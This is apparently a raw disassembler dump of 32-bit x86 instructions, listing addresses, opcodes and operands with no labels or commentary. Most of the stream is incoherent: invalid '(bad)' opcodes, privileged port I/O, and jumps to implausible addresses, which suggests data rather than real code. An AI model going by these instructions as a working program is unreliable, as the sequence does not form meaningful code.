  4177ef:	sub    DWORD PTR [edx],ebp
  4177f1:	or     eax,edi
  4177f3:	or     eax,0x77f058c6
  4177f8:	add    ch,BYTE PTR [edx+0x26]
  4177fb:	out    0xf8,al
  4177fd:	sti    
  4177fe:	sub    al,0xbb
  417800:	jle    0x4177bc
  417802:	cmp    dh,BYTE PTR [esi+edi*4]
  417805:	cmp    BYTE PTR [edx+eax*8+0x3df8ac3b],cl
  41780c:	test   DWORD PTR [edi+0x253fed44],edi
  417812:	add    ebx,DWORD PTR [edi]
  417814:	jg     0x41788a
  417816:	push   es
  417817:	push   0x0
  417819:	push   ecx
  41781a:	sub    edi,DWORD PTR [esi+ebx*1-0x68c9e456]
  417821:	out    0x20,eax
  417823:	inc    ebx
  417824:	shl    edx,0x1a
  417827:	sub    DWORD PTR [edx+0x7acf251a],0x12
  41782e:	cld    
  41782f:	add    al,0x3b
  417831:	or     BYTE PTR [edi],0x92
  417834:	xor    ecx,DWORD PTR [ebp+esi*4+0x58ffa395]
  41783b:	popa   
  41783c:	lock iret 
  41783e:	ins    DWORD PTR es:[edi],dx
  41783f:	mov    dl,0xf
  417841:	xor    al,0xfa
  417843:	fisubr DWORD PTR [ebp-0x142d7821]
  41784a:	dec    edx
  41784b:	adc    edx,edi
  41784d:	cmp    edi,DWORD PTR [esi+0x2c]
  417850:	pop    edx
  417851:	shl    DWORD PTR [edi-0x4f],cl
  417854:	imul   esp,DWORD PTR [eax+0x62f81b61],0x55
  41785b:	ins    BYTE PTR es:[edi],dx
  41785c:	ins    BYTE PTR es:[edi],dx
  41785d:	sub    bh,bl
  41785f:	popf   
  417860:	je     0x417839
  417862:	mov    esi,0x5b3561d9
  417867:	sub    al,0xfc
  417869:	mov    eax,?
  41786b:	cs pop edx
  41786d:	out    dx,al
  41786e:	or     DWORD PTR [ebx],eax
  417870:	sbb    BYTE PTR [ebx-0x11ea34fe],dh
  417876:	cwde   
  417877:	add    DWORD PTR [edi-0x5ca1d9b9],ebp
  41787d:	stc    
  41787e:	mov    edi,0x6abb2d3d
  417883:	retf   0xc060
  417886:	inc    edx
  417887:	push   ecx
  417888:	je     0x417821
  41788a:	jle    0x4178d8
  41788c:	out    0xfa,eax
  41788e:	pop    ecx
  41788f:	push   eax
  417890:	rcr    BYTE PTR [esi+0x5],cl
  417893:	lds    esi,FWORD PTR [ecx]
  417895:	lea    ebp,[edx]
  417897:	(bad)  
  417898:	dec    ecx
  417899:	call   0xe6acba64
  41789e:	sub    BYTE PTR [eax],ah
  4178a0:	sub    BYTE PTR [edi],bh
  4178a2:	inc    eax
  4178a3:	icebp  
  4178a4:	mov    ds:0x73c6832d,eax
  4178a9:	jae    0x4178b4
  4178ab:	loope  0x417874
  4178ad:	inc    edi
  4178ae:	adc    al,0xea
  4178b0:	enter  0xbbe3,0xc8
  4178b4:	push   esp
  4178b5:	cmc    
  4178b6:	sbb    al,0x99
  4178b8:	enter  0x578d,0xed
  4178bc:	jle    0x417917
  4178be:	cmp    ecx,DWORD PTR cs:[edx]
  4178c1:	mov    ebp,0xff5ad867
  4178c6:	popa   
  4178c7:	(bad)  
  4178c8:	adc    eax,0x7e1130f
  4178cd:	int    0xab
  4178cf:	dec    esi
  4178d0:	sub    edx,DWORD PTR [esp+edi*4+0x24bcf80d]
  4178d7:	rcr    BYTE PTR ds:0x9c1d6156,0x2f
  4178de:	or     bh,BYTE PTR [edi+eax*8-0x11]
  4178e2:	pop    edi
  4178e3:	call   0x46fdc381
  4178e8:	sub    cl,bl
  4178ea:	loopne 0x41795e
  4178ec:	sbb    al,0x38
  4178ee:	stos   DWORD PTR es:[edi],eax
  4178ef:	inc    ebx
  4178f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178f1:	jnp    0x417878
  4178f3:	(bad)  
  4178f4:	lock or al,0x4e
  4178f7:	aas    
  4178f8:	cdq    
  4178f9:	jo     0x417969
  4178fb:	mov    ds:0xa2dbdd8f,al
  417900:	std    
  417901:	cld    
  417902:	into   
  417903:	xlat   BYTE PTR ds:[ebx]
  417904:	ja     0x417927
  417906:	jns    0x4178c0
  417908:	mov    esp,0xb3403d11
  41790d:	inc    esp
  41790e:	mov    DWORD PTR [eax-0x5c],esp
  417911:	test   BYTE PTR [edi],bh
  417913:	xchg   esp,eax
  417914:	into   
  417915:	mov    eax,0x934cbdba
  41791a:	ja     0x417902
  41791c:	call   0x5d1d:0x8fe35028
  417923:	push   ds
  417924:	push   0x6f
  417926:	cld    
  417927:	push   esi
  417928:	ja     0x4178b5
  41792a:	push   esp
  41792b:	pop    eax
  41792c:	pop    eax
  41792d:	mov    bh,0xca
  41792f:	(bad)  [eax]
  417931:	jae    0x417920
  417933:	out    0xf3,eax
  417935:	sbb    DWORD PTR [eax],eax
  417937:	pop    edi
  417938:	nop
  417939:	and    al,0x7f
  41793b:	jns    0x4178ee
  41793d:	std    
  41793e:	ficom  DWORD PTR [ecx]
  417940:	repz jo 0x4179c1
  417943:	rcl    BYTE PTR [edx+0x170be904],0x78
  41794a:	(bad)  
  41794b:	aam    0x91
  41794d:	mov    al,0x8c
  41794f:	cmp    BYTE PTR [edx],ch
  417951:	add    eax,0x66912cdc
  417956:	jecxz  0x41799b
  417958:	jge    0x41793b
  41795a:	and    edi,DWORD PTR [ecx*8+0x36a09666]
  417961:	pop    edx
  417962:	cmp    al,0x3
  417964:	into   
  417965:	bound  edi,QWORD PTR [edx+edx*2-0x4c399022]
  41796c:	iret   
  41796d:	not    BYTE PTR [edx-0x7ac48dde]
  417973:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  417975:	(bad)
  417979:	mov    ebx,0xbf840be
  41797e:	add    al,0x13
  417980:	push   0x83106183
  417985:	jmp    0xfca8a133
  41798a:	push   edx
  41798b:	dec    ecx
  41798c:	dec    eax
  41798d:	call   0xfb54ad9b
  417992:	dec    ecx
  417993:	int3   
  417994:	adc    edi,esi
  417996:	stos   BYTE PTR es:[edi],al
  417997:	adc    eax,edx
  417999:	scas   eax,DWORD PTR es:[edi]
  41799a:	xor    al,0x46
  41799c:	mov    esi,0x401ffcb8
  4179a1:	cmp    dh,dl
  4179a3:	jns    0x4179fd
  4179a5:	nop
  4179a6:	outs   dx,BYTE PTR ds:[esi]
  4179a7:	fcomp  DWORD PTR [ecx-0x3ea844e]
  4179ad:	cmc    
  4179ae:	test   al,0x39
  4179b0:	add    ah,BYTE PTR ds:0x282e29c3
  4179b6:	into   
  4179b7:	loope  0x417a11
  4179b9:	add    al,dh
  4179bb:	in     eax,dx
  4179bc:	push   es
  4179bd:	in     al,dx
  4179be:	jecxz  0x417962
  4179c0:	fmul   DWORD PTR [ebp+0x77]
  4179c3:	xlat   BYTE PTR ds:[ebx]
  4179c4:	(bad)  
  4179c6:	push   cs
  4179c7:	call   0xacd1a243
  4179cc:	pop    edx
  4179cd:	mov    DWORD PTR [esi-0x78d2523],ecx
  4179d3:	jmp    0x417a10
  4179d5:	gs xchg ebx,eax
  4179d7:	(bad)  
  4179d8:	adc    eax,0x72d902da
  4179dd:	pop    esi
  4179de:	and    BYTE PTR [edx],0x2b
  4179e1:	adc    ch,BYTE PTR [edi]
  4179e3:	push   es
  4179e4:	loop   0x417a32
  4179e6:	(bad)  
  4179e7:	hlt    
  4179e8:	iret   
  4179e9:	push   ebp
  4179ea:	xor    BYTE PTR [ebp+0x55ff7965],bl
  4179f0:	out    0xda,eax
  4179f2:	dec    edi
  4179f3:	xchg   ebx,eax
  4179f4:	push   ss
  4179f5:	shl    DWORD PTR es:[ecx],cl
  4179f8:	fwait
  4179f9:	mov    ah,0x34
  4179fb:	imul   ecx,DWORD PTR [edi+0x0],0x65
  4179ff:	sub    ch,BYTE PTR [eax+0x18]
  417a02:	or     ecx,edi
  417a04:	dec    ebp
  417a05:	jmp    0xac7f6652
  417a0a:	cmc    
  417a0b:	and    eax,0xa66860ba
  417a10:	push   ecx
  417a11:	sar    BYTE PTR ds:0x9f211319,cl
  417a17:	sbb    bl,BYTE PTR [edi+0x6d89529f]
  417a1d:	lock stc 
  417a1f:	jbe    0x4179e8
  417a21:	out    dx,al
  417a22:	cmp    eax,ecx
  417a24:	cmp    BYTE PTR [esi+0x75],ch
  417a27:	enter  0xf083,0x3c
  417a2b:	xchg   DWORD PTR [edi+0x52],esp
  417a2e:	hlt    
  417a2f:	fdivr  QWORD PTR [eax]
  417a31:	imul   BYTE PTR [ecx+0x347e3326]
  417a37:	pop    eax
  417a38:	outs   dx,BYTE PTR ds:[esi]
  417a39:	or     DWORD PTR [edi-0x5ba976c7],ecx
  417a3f:	dec    edi
  417a40:	jnp    0x417a87
  417a42:	(bad)  
  417a43:	add    bh,ah
  417a45:	push   ss
  417a46:	sub    al,BYTE PTR [ecx+0x35]
  417a49:	cmp    BYTE PTR [ecx+ebp*2+0x75],0x3a
  417a4e:	add    al,BYTE PTR [edx]
  417a50:	retf   0xbecf
  417a53:	retf   0xe585
  417a56:	fwait
  417a57:	jbe    0x417a61
  417a59:	xor    DWORD PTR [edx-0x6c],ebx
  417a5c:	stos   DWORD PTR es:[edi],eax
  417a5d:	pop    edi
  417a5e:	or     BYTE PTR [edx],ah
  417a60:	adc    al,0xd1
  417a62:	mov    eax,ds:0x619a6eb5
  417a67:	bound  edx,QWORD PTR [ecx]
  417a69:	test   DWORD PTR [esi-0x1d],esi
  417a6c:	xchg   BYTE PTR ds:0xb4438a9e,bl
  417a72:	push   cs
  417a73:	lods   eax,DWORD PTR ds:[esi]
  417a74:	or     dh,cl
  417a76:	inc    ebx
  417a77:	out    0xc0,eax
  417a79:	adc    al,0xc6
  417a7b:	int    0xe7
  417a7d:	jae    0x417a96
  417a7f:	ficom  DWORD PTR [esp+edx*1+0x1c]
  417a83:	mov    esi,edx
  417a85:	mov    bl,0xee
  417a87:	xchg   ebp,eax
  417a88:	iret   
  417a89:	dec    edx
  417a8a:	xor    ebx,DWORD PTR [eax-0x32]
  417a8d:	mov    bp,0x101e
  417a91:	sub    edi,edi
  417a93:	aam    0x5d
  417a95:	ret    0x3565
  417a98:	pop    eax
  417a99:	bound  esi,QWORD PTR [edi-0x19]
  417a9c:	fadd   DWORD PTR ds:0x8213c579
  417aa2:	xchg   ecx,eax
  417aa3:	call   0x6a5b3155
  417aa8:	test   eax,0xc7008fc8
  417aad:	push   es
  417aae:	mov    ds:0x4eca001c,eax
  417ab3:	call   0x1c031d83
  417ab8:	js     0x417a8a
  417aba:	xor    DWORD PTR [ecx],esp
  417abc:	lods   al,BYTE PTR ds:[esi]
  417abd:	mov    ecx,0xa0c38556
  417ac2:	sbb    bh,BYTE PTR [ecx+ecx*1-0x45]
  417ac6:	dec    edi
  417ac7:	sub    BYTE PTR [edx-0x26],cl
  417aca:	aaa    
  417acb:	jne    0x417b45
  417acd:	and    ah,BYTE PTR [ebp-0x2d]
  417ad0:	cs pop esp
  417ad2:	dec    edi
  417ad3:	scas   eax,DWORD PTR es:[edi]
  417ad4:	xor    ebp,DWORD PTR [edi]
  417ad6:	(bad)  
  417ad7:	iret   
  417ad8:	cmc    
  417ad9:	into   
  417ada:	int    0xed
  417adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417add:	sbb    al,0xaf
  417adf:	mov    ebx,0xb960ca1b
  417ae4:	inc    ebp
  417ae5:	adc    ebp,DWORD PTR [ebx+0x1d21135b]
  417aeb:	dec    ebx
  417aec:	mov    ds:0xcd3229ac,eax
  417af1:	push   edx
  417af2:	aam    0x77
  417af4:	test   al,0x52
  417af6:	dec    esi
  417af7:	lea    esi,[edi-0xbb9492]
  417afd:	xor    DWORD PTR [eax-0x7016bfa9],edi
  417b03:	jne    0x417b5f
  417b05:	and    al,0xbc
  417b07:	pop    edi
  417b08:	leave  
  417b09:	add    al,0x38
  417b0b:	add    al,0x44
  417b0d:	push   0x67
  417b0f:	das    
  417b10:	cmp    eax,0x435800d7
  417b15:	dec    ebx
  417b16:	pop    ebp
  417b17:	repz bound eax,QWORD PTR [eax+0x9]
  417b1b:	les    esi,FWORD PTR [ecx-0x6f99e95a]
  417b21:	dec    edi
  417b22:	call   0x79803cb8
  417b27:	daa    
  417b28:	cmp    DWORD PTR [ebp-0x21],0xc0b324ba
  417b2f:	pop    es
  417b30:	fcomp  st(4)
  417b32:	and    DWORD PTR [esi],ecx
  417b34:	das    
  417b35:	dec    ebp
  417b36:	xchg   esi,eax
  417b37:	(bad)  
  417b38:	mov    dl,0xbf
  417b3a:	adc    dl,bh
  417b3c:	and    al,BYTE PTR [ebx+0x3e951064]
  417b42:	push   ds
  417b43:	xchg   esi,eax
  417b44:	jne    0x417ae2
  417b46:	je     0x417b65
  417b48:	pushf  
  417b49:	mov    ecx,0xb527102f
  417b4e:	pop    eax
  417b4f:	popa   
  417b50:	mov    esi,0x530e915a
  417b55:	dec    esp
  417b56:	outs   dx,DWORD PTR ds:[si]
  417b58:	pop    edx
  417b59:	jle    0x417af5
  417b5b:	add    edx,edi
  417b5d:	sub    esi,DWORD PTR [esi]
  417b5f:	nop
  417b60:	mov    ah,0xce
  417b62:	bnd jnp 0x417bdb
  417b65:	scas   eax,DWORD PTR es:[edi]
  417b66:	add    edi,esi
  417b68:	mov    ds:0x15023a90,eax
  417b6d:	repz (bad) 
  417b6f:	mov    bh,0x97
  417b71:	out    0xe7,eax
  417b73:	sbb    ebx,edx
  417b75:	push   esp
  417b76:	test   BYTE PTR [ebx+0x257c3c9f],cl
  417b7c:	stos   DWORD PTR es:[edi],eax
  417b7d:	mov    eax,ds:0xf672c50e
  417b82:	stos   DWORD PTR es:[edi],eax
  417b83:	fcom   QWORD PTR [eax-0x4bda7da4]
  417b8a:	jmp    0x417c01
  417b8c:	pop    ebp
  417b8d:	xor    dl,BYTE PTR [ecx]
  417b8f:	and    eax,0x502e0381
  417b94:	mov    DWORD PTR ss:[eax],edx
  417b97:	and    eax,0x6a50d198
  417b9c:	adc    eax,0xe26799b3
  417ba1:	popa   
  417ba2:	mov    ds:0xfd4308da,al
  417ba7:	xor    DWORD PTR [ecx],edx
  417ba9:	das    
  417baa:	jbe    0x417b47
  417bac:	out    dx,al
  417bad:	test   eax,0xf38f40ec
  417bb2:	sub    DWORD PTR [esi-0x2076ba98],ebp
  417bb8:	imul   esp,ebx,0xffffff8e
  417bbb:	or     BYTE PTR [edi+0x4596f69f],cl
  417bc1:	cmp    DWORD PTR [eax-0x3c359666],eax
  417bc7:	repnz push ss
  417bc9:	cmp    DWORD PTR [esi+0x3f2e0322],edi
  417bcf:	dec    esi
  417bd0:	mov    ebx,0x8e83a7ce
  417bd5:	push   ebp
  417bd6:	pop    edi
  417bd7:	inc    ebp
  417bd8:	push   edi
  417bd9:	xchg   esp,eax
  417bda:	and    BYTE PTR [esi-0x7c7ff4c2],0x5b
  417be1:	es mov ah,0x4e
  417be4:	nop
  417be5:	adc    eax,0xc80e2e19
  417bea:	sub    bl,BYTE PTR [edi]
  417bec:	nop
  417bed:	mov    ebx,0x789370bc
  417bf2:	test   eax,0x87c82f6a
  417bf7:	pop    ebp
  417bf8:	fs jns 0x417c5c
  417bfb:	jmp    0x417bb6
  417bfd:	or     dl,BYTE PTR [ecx+eax*4+0x497d90d6]
  417c04:	gs rcl bh,0x45
  417c08:	div    BYTE PTR [ebx]
  417c0a:	mov    ds:0xdd50b14e,eax
  417c0f:	mov    ebp,0xcd39b066
  417c14:	int    0x73
  417c16:	sub    DWORD PTR [esi+0x3a8f6e81],ecx
  417c1c:	stos   BYTE PTR es:[edi],al
  417c1d:	ins    DWORD PTR es:[edi],dx
  417c1e:	test   ebx,edx
  417c20:	retf   0x936f
  417c23:	fnstcw WORD PTR [edi-0x3614f0f0]
  417c29:	mov    edi,0xf8285e13
  417c2e:	or     bl,BYTE PTR [edx+0x6f]
  417c31:	dec    ebx
  417c32:	dec    ebx
  417c33:	cs mov cl,0x57
  417c36:	test   DWORD PTR [edi-0x25],esp
  417c39:	push   ebx
  417c3a:	js     0x417bed
  417c3c:	add    BYTE PTR [edi+esi*2],cl
  417c3f:	adc    eax,0xd309d741
  417c44:	scas   eax,DWORD PTR es:[edi]
  417c45:	stc    
  417c46:	nop
  417c47:	addr16 and al,0x51
  417c4a:	jmp    0x417c0f
  417c4c:	inc    eax
  417c4d:	mov    ebp,0x68cf82d3
  417c52:	mov    ch,0x61
  417c54:	inc    edx
  417c55:	fnstenv [eax+ecx*1-0xd72807c]
  417c5c:	hlt    
  417c5d:	cli    
  417c5e:	adc    eax,0x179bc4d0
  417c63:	ss push esi
  417c65:	test   eax,0xaf11b712
  417c6a:	mov    al,ds:0x9467523
  417c6f:	in     eax,dx
  417c70:	add    dl,BYTE PTR [ecx-0x64]
  417c73:	jnp    0x417c9e
  417c75:	test   DWORD PTR [ecx+0x6bc7ca68],0x7d64d2b
  417c7f:	and    al,0xf7
  417c81:	adc    eax,0x2e4e707e
  417c86:	pushf  
  417c87:	push   ebx
  417c88:	ins    BYTE PTR es:[edi],dx
  417c89:	(bad)  
  417c8a:	xchg   ebx,eax
  417c8b:	fisubr WORD PTR [ebp+eax*1-0xf]
  417c8f:	jecxz  0x417cee
  417c91:	(bad)  
  417c92:	aas    
  417c93:	cmp    bh,cl
  417c95:	ficom  DWORD PTR [esi-0x46]
  417c98:	sub    eax,DWORD PTR [ebx]
  417c9a:	push   ecx
  417c9b:	outs   dx,DWORD PTR ds:[esi]
  417c9c:	jb     0x417c91
  417c9e:	fstp   DWORD PTR [ebx+eax*1-0x4]
  417ca2:	sti    
  417ca3:	push   eax
  417ca4:	retf   0x85c0
  417ca7:	sbb    bl,BYTE PTR [eax]
  417ca9:	and    dl,BYTE PTR [edx-0x2e]
  417cac:	daa    
  417cad:	call   0xb7a2f1cd
  417cb2:	pushf  
  417cb3:	xchg   esp,eax
  417cb4:	retf   
  417cb5:	add    al,BYTE PTR [eax]
  417cb7:	cmp    eax,0xc9961204
  417cbc:	mov    ecx,0x9ad7b4e1
  417cc1:	jbe    0x417d40
  417cc3:	in     al,dx
  417cc4:	sbb    eax,0x5fc3fb07
  417cc9:	pop    ecx
  417cca:	or     ebp,0xc22c7be
  417cd0:	inc    edi
  417cd1:	shl    DWORD PTR ds:0x7a0d0126,1
  417cd7:	fcmovbe st,st(7)
  417cd9:	adc    al,0xf4
  417cdb:	(bad)  
  417cdc:	jecxz  0x417c6e
  417cde:	nop
  417cdf:	push   0x2f
  417ce1:	sti    
  417ce2:	inc    ebx
  417ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ce4:	push   ds
  417ce5:	xor    al,0x1e
  417ce7:	pop    ss
  417ce8:	cmp    cl,ch
  417cea:	hlt    
  417ceb:	sbb    edx,DWORD PTR [eax]
  417ced:	xchg   edi,eax
  417cee:	pop    edx
  417cef:	push   cs
  417cf0:	sub    edi,ebx
  417cf2:	jbe    0x417d15
  417cf4:	jns    0x417d36
  417cf6:	add    BYTE PTR [edi-0x5],ch
  417cf9:	xor    eax,0x2b809ff5
  417cfe:	ss pop eax
  417d00:	dec    edx
  417d01:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  417d03:	xchg   esp,eax
  417d04:	add    al,0x2b
  417d06:	and    esp,eax
  417d08:	xor    DWORD PTR [eax],0xffffffc4
  417d0b:	xor    eax,0xab2efabe
  417d10:	push   0xffffff97
  417d12:	sti    
  417d13:	das    
  417d14:	inc    eax
  417d15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d16:	stos   DWORD PTR es:[edi],eax
  417d17:	dec    ecx
  417d18:	push   esp
  417d19:	fwait
  417d1a:	scas   eax,DWORD PTR es:[edi]
  417d1b:	mov    esp,DWORD PTR [ebx]
  417d1d:	sar    DWORD PTR [edx+eax*2],cl
  417d20:	pusha  
  417d21:	sar    DWORD PTR [ebx-0x38],0x96
  417d25:	xor    esp,0xd1e7f706
  417d2b:	adc    BYTE PTR [eax+edi*8+0x4c],ah
  417d2f:	aam    0x5a
  417d31:	cwde   
  417d32:	cmp    DWORD PTR [esi+0x65],0xffffff8a
  417d36:	daa    
  417d37:	adc    DWORD PTR [esp+edx*8+0x37],esi
  417d3b:	mov    al,ds:0x92373494
  417d40:	mov    bh,0xdc
  417d42:	call   0xc45b3f8f
  417d47:	sub    DWORD PTR [ebx+eax*8+0x162b6b03],edi
  417d4e:	enter  0xb123,0x6d
  417d52:	out    dx,al
  417d53:	adc    ah,cl
  417d55:	xor    al,ch
  417d57:	int3   
  417d58:	pop    ss
  417d59:	fistp  DWORD PTR [ecx]
  417d5b:	xchg   esi,eax
  417d5c:	inc    ebp
  417d5d:	nop
  417d5e:	xor    al,0x7c
  417d60:	xchg   ebp,eax
  417d61:	mov    ebp,0x9e0670f6
  417d66:	retf   0xa413
  417d69:	scas   al,BYTE PTR es:[edi]
  417d6a:	sbb    eax,0xbc163772
  417d6f:	cwde   
  417d70:	test   eax,0xbf680263
  417d75:	push   eax
  417d76:	xchg   edx,eax
  417d77:	loope  0x417dc9
  417d79:	mov    edx,0x454f744e
  417d7e:	mov    bh,0x33
  417d80:	outs   dx,DWORD PTR ds:[esi]
  417d81:	fistp  WORD PTR [esi]
  417d84:	in     eax,dx
  417d85:	inc    ebp
  417d86:	imul   ebp,DWORD PTR [edi+eax*2],0xffffffc0
  417d8a:	test   BYTE PTR [ebx+ebx*4+0x5a2ad92e],dl
  417d91:	or     al,0x4a
  417d93:	repnz xor ecx,edx
  417d96:	sub    edx,esp
  417d98:	dec    ebp
  417d99:	sub    DWORD PTR [ebx+0x47],edi
  417d9c:	push   ecx
  417d9d:	call   0x82b0badc
  417da2:	sub    ch,cl
  417da4:	pop    edi
  417da5:	pop    esp
  417da6:	(bad)  ds:0x6a458e
  417dac:	sbb    al,0x6d
  417dae:	xor    ebp,DWORD PTR [eax+eiz*2+0x4d1e4104]
  417db5:	sub    bh,BYTE PTR [ecx]
  417db7:	add    DWORD PTR [ebx-0x20118fd],ecx
  417dbd:	shl    DWORD PTR [ebp+eax*4-0x1d],cl
  417dc1:	in     eax,0xdc
  417dc3:	lea    edi,[ebx+0x26cf05b5]
  417dc9:	stos   BYTE PTR es:[edi],al
  417dca:	fcomp  QWORD PTR [eax+0x74]
  417dcd:	inc    esi
  417dce:	pop    eax
  417dcf:	out    dx,al
  417dd0:	add    edi,DWORD PTR [eax]
  417dd2:	addr16 cdq 
  417dd4:	cwde   
  417dd5:	shl    DWORD PTR [esi+0x5],cl
  417dd8:	bound  ebx,QWORD PTR [edi+0x27aa2e27]
  417dde:	data16 hlt 
  417de0:	retf   0xc41a
  417de3:	in     al,dx
  417de4:	mov    cl,0x16
  417de6:	sub    edx,DWORD PTR [esi+eiz*4]
  417de9:	pop    edx
  417dea:	int3   
  417deb:	js     0x417dd7
  417ded:	iret   
  417dee:	cmp    al,0x72
  417df0:	test   DWORD PTR [ebx-0x62],edx
  417df3:	add    dl,BYTE PTR [edx+0x4d]
  417df6:	dec    ecx
  417df7:	or     eax,0x7a3e957
  417dfc:	push   0xd0b72c67
  417e01:	push   esp
  417e02:	mov    bh,0x32
  417e04:	add    DWORD PTR ds:0xb3fb732,ebp
  417e0a:	test   BYTE PTR [eax+edx*2],al
  417e0d:	outs   dx,BYTE PTR ds:[esi]
  417e0e:	fiadd  DWORD PTR [ebx+edx*4]
  417e11:	test   ecx,esi
  417e13:	pusha  
  417e14:	or     eax,0x938c03
	...
  417fd5:	add    BYTE PTR [eax],al
  417fd7:	add    BYTE PTR [esi],cl
  417fd9:	pop    esp
  417fda:	mov    esp,0xffe7fe47
  417fdf:	pop    ebp
  417fe0:	es mov eax,0x74fdfe17
  417fe6:	loopne 0x417ff1
  417fe8:	leave  
  417fe9:	fild   DWORD PTR [ecx]
  417feb:	add    BYTE PTR ds:0x77000007,ah
  417ff1:	inc    eax
  417ff2:	xor    edx,ecx
  417ff4:	sahf   
  417ff5:	mov    cl,0xa3
  417ff7:	call   0x6e742ba4
  417ffc:	xor    al,0x91
  417ffe:	inc    eax
  417fff:	imul   ebx,DWORD PTR [esi+0x62222ceb],0x59dae6b3
  418009:	in     eax,dx
  41800a:	pop    ds
  41800b:	aam    0x9a
  41800d:	fiadd  DWORD PTR [ebp-0x53]
  418010:	mov    bl,0x26
  418012:	je     0x418065
  418014:	fstp   DWORD PTR [ebp+0x73]
  418017:	sub    BYTE PTR [esi],ch
  418019:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41801a:	sar    DWORD PTR [esi-0x6b33c098],0x68
  418021:	ret    0x6ca1
  418024:	ja     0x417ffe
  418026:	jecxz  0x417fa9
  418028:	dec    ebp
  418029:	pop    edi
  41802a:	arpl   bp,dx
  41802c:	loop   0x417fd2
  41802e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41802f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418030:	pop    ds
  418031:	ret    
  418032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418033:	dec    ebp
  418034:	jg     0x41806b
  418036:	fldenv [esi-0x6f073c3e]
  41803c:	cmp    cl,bl
  41803e:	pop    esp
  41803f:	leave  
  418040:	jno    0x418046
  418042:	data16 mov dl,BYTE PTR [edx-0x27e37f51]
  418049:	sbb    eax,0x334c6691
  41804e:	mov    bh,0x41
  418050:	hlt    
  418051:	dec    ecx
  418052:	test   al,0x95
  418054:	and    DWORD PTR [ebx-0x5f],0x4e
  418058:	jb     0x418006
  41805a:	sbb    al,0x4b
  41805c:	or     DWORD PTR ds:0xdc71684c,ecx
  418062:	(bad)  
  418063:	jg     0x41801d
  418065:	rcr    eax,cl
  418067:	and    BYTE PTR [ebx-0xc73d784],al
  41806d:	and    BYTE PTR [eax],bl
  41806f:	scas   eax,DWORD PTR es:[edi]
  418070:	mov    esp,0xbe099556
  418075:	cld    
  418076:	mov    dl,0x23
  418078:	outs   dx,DWORD PTR ds:[esi]
  418079:	pop    esi
  41807a:	and    edx,esp
  41807c:	cmp    BYTE PTR [ecx+0x63],bl
  41807f:	cli    
  418080:	cmp    esi,esi
  418082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418083:	arpl   ax,cx
  418085:	pop    eax
  418086:	jge    0x418066
  418088:	or     al,0x93
  41808a:	mov    bh,0x71
  41808c:	mov    ?,WORD PTR [ebx-0xb]
  41808f:	std    
  418090:	enter  0x9ad2,0xc8
  418094:	mov    edi,0x779bf88b
  418099:	jge    0x418071
  41809b:	cmp    DWORD PTR [edi+0x69],edi
  41809e:	mov    ebp,0x54b9e44f
  4180a3:	jns    0x4180fe
  4180a5:	rcl    DWORD PTR [edx+0x2c],1
  4180a8:	sub    al,0x28
  4180aa:	push   ebp
  4180ab:	add    BYTE PTR [esi-0x7cf72916],cl
  4180b1:	hlt    
  4180b2:	xor    esi,DWORD PTR [ebx]
  4180b4:	mov    al,0x45
  4180b6:	or     al,0x8b
  4180b8:	mov    edi,0x654d0ceb
  4180bd:	test   DWORD PTR [edx],edi
  4180bf:	push   edi
  4180c0:	in     al,0xb9
  4180c2:	xchg   ecx,eax
  4180c3:	dec    edi
  4180c4:	out    dx,eax
  4180c5:	pop    ecx
  4180c6:	icebp  
  4180c7:	mov    ecx,0x82eaeb95
  4180cc:	mov    ah,0xfe
  4180ce:	pop    esp
  4180cf:	ror    BYTE PTR [edx+ecx*1],cl
  4180d2:	add    ebx,DWORD PTR [eax-0x38461bc0]
  4180d8:	push   ss
  4180d9:	test   eax,0xfd9bb0e6
  4180de:	mov    ds:0x7b6ff61,al
  4180e3:	jp     0x418103
  4180e5:	pop    edx
  4180e6:	rol    ch,cl
  4180e8:	loope  0x41813f
  4180ea:	sti    
  4180eb:	cli    
  4180ec:	add    esp,edi
  4180ee:	jg     0x418151
  4180f0:	pop    esi
  4180f1:	mov    DWORD PTR [ecx+0x39cb0cd2],ebp
  4180f7:	mov    ah,0x58
  4180f9:	retf   0xaf5c
  4180fc:	sub    eax,0x5fba8b5c
  418101:	je     0x418117
  418103:	gs out dx,eax
  418105:	(bad)  
  418106:	mov    al,0x6c
  418108:	xchg   esp,eax
  418109:	jmp    0x96ea:0xfa121804
  418110:	xor    DWORD PTR [esi],ebx
  418112:	pop    eax
  418113:	xchg   esp,eax
  418114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418115:	sub    esp,edx
  418117:	aas    
  418118:	jno    0x4180d8
  41811a:	jns    0x4180cc
  41811c:	shl    bl,0x7
  41811f:	retf   0xe4f4
  418122:	repnz inc ebx
  418124:	jae    0x41813e
  418126:	mov    edx,0x46a2adf
  41812b:	dec    ecx
  41812c:	retf   0xe8df
  41812f:	in     eax,0x9d
  418131:	add    bl,cl
  418133:	adc    dh,BYTE PTR [edx]
  418135:	pop    ds
  418136:	das    
  418137:	je     0x41812e
  418139:	dec    esp
  41813a:	(bad)  
  41813b:	sti    
  41813c:	cmp    DWORD PTR [esi-0x67],eax
  41813f:	imul   edi,DWORD PTR [ebp+eax*2-0x219d3e1a],0x43829533
  41814a:	xor    eax,DWORD PTR [edx-0x44]
  41814d:	xor    eax,0x36c3fb82
  418152:	dec    edx
  418153:	dec    ebx
  418154:	out    0x11,al
  418156:	adc    edi,DWORD PTR [ebx]
  418158:	add    eax,0xbef25dbc
  41815d:	sbb    ecx,DWORD PTR [edi+0x46]
  418160:	stos   DWORD PTR es:[edi],eax
  418161:	mov    bh,0x30
  418163:	aaa    
  418164:	adc    DWORD PTR [edx+0xc84894f],eax
  41816a:	push   ebp
  41816b:	push   ecx
  41816c:	scas   al,BYTE PTR es:[edi]
  41816d:	mov    ecx,0xd7909af9
  418172:	in     eax,dx
  418173:	xchg   edi,eax
  418174:	adc    ecx,DWORD PTR [esi-0x2]
  418177:	das    
